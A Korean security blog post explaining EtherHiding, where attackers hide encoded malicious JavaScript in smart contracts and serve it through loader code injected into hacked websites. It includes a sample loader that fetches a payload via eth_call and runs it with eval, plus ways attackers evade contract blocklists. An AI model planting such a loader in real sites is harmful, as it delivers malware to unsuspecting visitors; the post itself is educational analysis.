---
title: Abusing Web3 - EtherHiding 
date: 2025-12-09 15:00:00 +0900
---

예전에 ENKI에서 발간한 [EtherHiding](https://www.enki.co.kr/media-center/blog/analysis-of-the-clearfake-campaign-using-clickfix-and-etherhiding-techniques)기법에 관한 글을 읽은 적이 있었다. 그러다가 이번에 react에서 CVE 10.0점짜리 react2shell 취약점이 나오며 새롭게 등장한 [react2shell + etherHiding 기법을 합친 북한의 공격](https://www.sysdig.com/blog/etherrat-dprk-uses-novel-ethereum-implant-in-react2shell-attacks)에 대한 글을 읽고, ~~웹서비스보안쪽은 문외한이지만~~ 웹사이트 피싱 등 공격에 블록체인이 사용된다는 안타까움과 함께, 해당 공격 기법에 대해 간략하게나마 공부해보았다. 

> 하이퍼링크로 걸어놓은 참고 링크도 한 번씩 읽어보면 좋을 듯 하다.

이 기법에 대해 한 마디로 줄여보자면, 블록체인 storage/transaction을 **C&C(Command&Control)서버로 악용하는 공격** 기법이라고 할 수 있다. 

이 기법에 활용되는 블록체인(web3)의 특성은 **"탈중앙화"**와 **"불변성"**이라고 할 수 있을 것이다. 누구나 블록체인에 데이터를 올릴 수 있고, 체인이 유지되는 한 해당 데이터는 사라지지 않는다. 이는 블록체인 기반 서비스를 이용하는 사용자들에게도 좋은 점이지만, 악용하는 해커들에게도 좋은 리소스가 될 수 있다는 것이다. 

# EtherHiding 공격 시퀀스 

## 1. 초기 단계
1. 공격자는 먼저 악성 웹사이트를 구축하거나, 기존 사이트(워드프레스 등)을 공격하여 로더 JS 코드를 삽입한다. (ether.js 등 Web3 라이브러리를 통해 컨트랙트에 call할 수 있는 JS 코드)

2. 블록체인(Mainnet / BSC chain 등)에 Base64/XOR/Hex 등으로 인코딩된 악성코드를 담은 스마트 컨트랙트를 배포한다. (`string public payload` 형태)

```JS
// 삽입되는 로더 JS 코드 예시 (실제 사례들과 많이 다름)
(async function() {
    // 1. Web3 인스턴스
    const rpc = 'rpc_url';
    const web3 = new Web3(new Web3.providers.HttpProvider(rpc));
    
    // 2. 대상 컨트랙트 정보 (공격자가 배포한 주소)
    const contractAddress = '0x1234...abcd'; // 악성 컨트랙트 주소
    const abi = [{"inputs":[],"name":"getPayload","outputs":[{"type":"string"}],"stateMutability":"view","type":"function"}]; // 컨트랙트의 getPayload 함수 ABI
    const contract = new web3.eth.Contract(abi, contractAddress);
    
    // 3. eth_call로 payload query 및 decode
    const encodedPayload = await contract.methods.getPayload().call();
    const decodedPayload = atob(encodedPayload);

    eval(decodedPayload);
})();
```

## 2. 공격 단계
1. 일반 사용자가 피싱링크 등을 통해 악성페이지에 접속된 후, 로더 JS가 즉시 실행된다.
(public rpc를 통해 블록체인 쿼리가 가능하기 때문에, 네트워크 차단이 어려움)
2. 로더 JS를 통해 `eth_call`쿼리가 실행되어 컨트랙트 payload를 로드한다.
3. payload를 decode한 후, `eval()`등 메서드를 통해 payload를 실행한다. 
4. payload가 실행되어 피싱 공격이 실행된다.

## EtherHiding Sequence Diagram
공격 흐름도
!["EtherHiding Sequence Diagram"](assets/img/posts/2025-12-11-AboutEtherHiding/etherHidingSequence.png "EtherHiding Sequence Diagram")

# 방어 대책?
EtherHiding을 통한 공격을 막기는 쉽지 않다는 생각이 든다. 애초에 직접적인 공격기법이 아닌, 공격의 C&C 인프라로 블록체인 스토리지가 사용되는 것이기 때문에, 애초에 웹사이트 딴에서 악성 JS코드가 삽입되지 않아야 하거나, 피싱 링크를 누르지 않는 등 직접 대체하기는 힘들다. 

그리고 EtherHiding이 C&C 인프라로서 사용되는 것을 스캔하는 것도 힘들다. 
> **어뷰징 컨트랙트 주소에 call하는 메서드를 찾아서 차단하면 되지 않나?**
> 새로운 컨트랙트를 배포하면 그만

> **인코딩된 어뷰징 코드가 삽입된 컨트랙트를 탐지하여 막을 수 있지 않나?**
> 프록시 컨트랙트를 통해 우회 가능
> **그런 컨트랙트를 전부 블랙리스팅한다고 치면?**
> Well-known DApp의 스토리지에 악성 JS코드를 삽입하여 이용할 수 있음

이 외에도 수많은 우회 방식과 방어수단이 있을 수 있겠지만, 당장 생각나는 것들만 적어보았다. 

Web3 정말 지속되고 모두가 좋아하는 플랫폼으로 남으면 좋겠지만, 자꾸만 해커들의 타겟이 되어가고 있는 점이 안타까운 현실이다 ... 열심히 보안공부 해야겠다. 